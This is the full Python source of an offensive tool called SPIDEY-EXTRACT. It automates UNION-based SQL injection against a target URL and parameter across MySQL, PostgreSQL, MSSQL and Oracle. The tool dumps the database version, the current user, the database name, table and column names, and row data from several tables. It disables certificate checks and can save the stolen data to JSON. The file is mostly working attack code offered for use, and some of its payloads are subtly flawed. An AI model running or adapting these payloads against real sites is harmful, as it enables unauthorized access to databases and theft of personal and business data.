#!/usr/bin/env python3
"""
SPIDEY-EXTRACT - Ultimate Database Data Extraction Tool
Extracts tables, columns, and data from vulnerable SQL injection targets
"""

import requests
import re
import json
import os
from urllib.parse import urljoin

R, G, Y, B, C = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m'
X = '\033[0m'

def print_banner():
    """Print ASCII banner"""
    banner_path = os.path.join(os.path.dirname(__file__), 'b.txt')
    try:
        with open(banner_path, 'r') as f:
            print(f.read())
    except:
        pass

class Extractor:
    """Extract data from vulnerable database"""
    
    def __init__(self, url, param, method='GET', timeout=10, db_type='MySQL'):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.timeout = timeout
        self.db_type = db_type
        self.session = requests.Session()
        self.session.verify = False
        self.extracted = {}
    
    def request(self, payload):
        """Send extraction request"""
        try:
            if self.method == 'GET':
                r = self.session.get(self.url, params={self.param: payload}, timeout=self.timeout)
            else:
                r = self.session.post(self.url, data={self.param: payload}, timeout=self.timeout)
            return r.text
        except Exception as e:
            return ""
    
    def extract_version(self):
        """Extract database version"""
        payloads = {
            'MySQL': "' UNION SELECT @@version #",
            'PostgreSQL': "' UNION SELECT version() #",
            'MSSQL': "' UNION SELECT @@version #",
            'Oracle': "' UNION SELECT banner FROM v$version #",
        }
        
        payload = payloads.get(self.db_type, payloads['MySQL'])
        resp = self.request(payload)
        
        print(f"{G}[+] Database Version:{X}")
        print(f"    {resp[:200]}")
        return resp[:200]
    
    def extract_current_user(self):
        """Extract current database user"""
        payloads = {
            'MySQL': "' UNION SELECT user() #",
            'PostgreSQL': "' UNION SELECT user #",
            'MSSQL': "' UNION SELECT user_name() #",
            'Oracle': "' UNION SELECT user FROM dual #",
        }
        
        payload = payloads.get(self.db_type, payloads['MySQL'])
        resp = self.request(payload)
        
        print(f"{G}[+] Current User:{X}")
        print(f"    {resp[:200]}")
        return resp[:200]
    
    def extract_database_name(self):
        """Extract current database name"""
        payloads = {
            'MySQL': "' UNION SELECT database() #",
            'PostgreSQL': "' UNION SELECT current_database() #",
            'MSSQL': "' UNION SELECT db_name() #",
            'Oracle': "' UNION SELECT name FROM v$database #",
        }
        
        payload = payloads.get(self.db_type, payloads['MySQL'])
        resp = self.request(payload)
        
        print(f"{G}[+] Current Database:{X}")
        print(f"    {resp[:200]}")
        return resp[:200]
    
    def extract_tables(self):
        """Extract all table names"""
        payloads = {
            'MySQL': "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() #",
            'PostgreSQL': "' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema') #",
            'MSSQL': "' UNION SELECT STRING_AGG(name,',') FROM sys.tables #",
            'Oracle': "' UNION SELECT LISTAGG(table_name,',') FROM user_tables #",
        }
        
        payload = payloads.get(self.db_type, payloads['MySQL'])
        resp = self.request(payload)
        
        tables = resp.split(',') if ',' in resp else [resp]
        
        print(f"{G}[+] Tables Found: {len(tables)}{X}")
        for table in tables[:20]:  # Show first 20
            print(f"    - {table.strip()}")
        
        self.extracted['tables'] = [t.strip() for t in tables]
        return self.extracted['tables']
    
    def extract_columns(self, table):
        """Extract columns from table"""
        payloads = {
            'MySQL': f"' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database() #",
            'PostgreSQL': f"' UNION SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{table}' #",
            'MSSQL': f"' UNION SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=(SELECT object_id FROM sys.tables WHERE name='{table}') #",
            'Oracle': f"' UNION SELECT LISTAGG(column_name,',') FROM user_tab_columns WHERE table_name='{table.upper()}' #",
        }
        
        payload = payloads.get(self.db_type, payloads['MySQL'])
        resp = self.request(payload)
        
        columns = resp.split(',') if ',' in resp else [resp]
        
        print(f"{G}[+] Columns in {table}: {len(columns)}{X}")
        for col in columns[:15]:
            print(f"    - {col.strip()}")
        
        return [c.strip() for c in columns]
    
    def extract_data(self, table, columns, limit=50):
        """Extract data from table"""
        cols = ','.join(columns[:5])  # Limit to 5 columns
        
        payloads = {
            'MySQL': f"' UNION SELECT GROUP_CONCAT(CONCAT({cols}) SEPARATOR '|||') FROM {table} LIMIT {limit} #",
            'PostgreSQL': f"' UNION SELECT string_agg(CONCAT({cols}),'|||') FROM {table} LIMIT {limit} #",
            'MSSQL': f"' UNION SELECT STRING_AGG(CONCAT({cols}),'|||') FROM {table} #",
            'Oracle': f"' UNION SELECT LISTAGG({cols},'|||') FROM {table} WHERE rownum <= {limit} #",
        }
        
        payload = payloads.get(self.db_type, payloads['MySQL'])
        
        try:
            resp = self.request(payload)
            rows = resp.split('|||')
            
            print(f"{G}[+] Data from {table} ({len(rows)} rows):{X}")
            for row in rows[:10]:
                print(f"    {row}")
            
            return rows
        except Exception as e:
            print(f"{R}[-] Error extracting data: {e}{X}")
            return []
    
    def dump_database(self):
        """Full database dump"""
        print(f"\n{C}Starting database extraction...{X}\n")
        
        self.extract_version()
        print()
        self.extract_current_user()
        print()
        self.extract_database_name()
        print()
        
        tables = self.extract_tables()
        
        if tables:
            for table in tables[:5]:  # Extract from first 5 tables
                print()
                columns = self.extract_columns(table)
                if columns:
                    print()
                    self.extract_data(table, columns)
    
    def export_json(self, filename):
        """Export extracted data to JSON"""
        with open(filename, 'w') as f:
            json.dump(self.extracted, f, indent=2)
        print(f"{G}[+] Data exported to {filename}{X}")

def main():
    import argparse
    
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='SPIDEY-EXTRACT - Database Data Extraction Tool',
        epilog='''
Examples:
  python3 extractor.py -u http://target.com/search -p id
  python3 extractor.py -u http://target.com -p user_id --db mysql --export dump.json
  python3 extractor.py -u http://target.com -p q --db postgres -m post
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', required=True, help='Vulnerable parameter')
    parser.add_argument('-m', '--method', default='GET', help='HTTP method (GET/POST)')
    parser.add_argument('--db', default='MySQL', help='Database type')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout')
    parser.add_argument('--export', help='Export to JSON')
    
    args = parser.parse_args()
    
    print(f"""
{C}╔════════════════════════════════════════════════════════════════════╗{X}
{C}║          SPIDEY-EXTRACT - Database Extraction Tool                ║{X}
{C}╚════════════════════════════════════════════════════════════════════╝{X}
    """)
    
    extractor = Extractor(args.url, args.param, args.method, args.timeout, args.db)
    extractor.dump_database()
    
    if args.export:
        extractor.export_json(args.export)

if __name__ == '__main__':
    main()
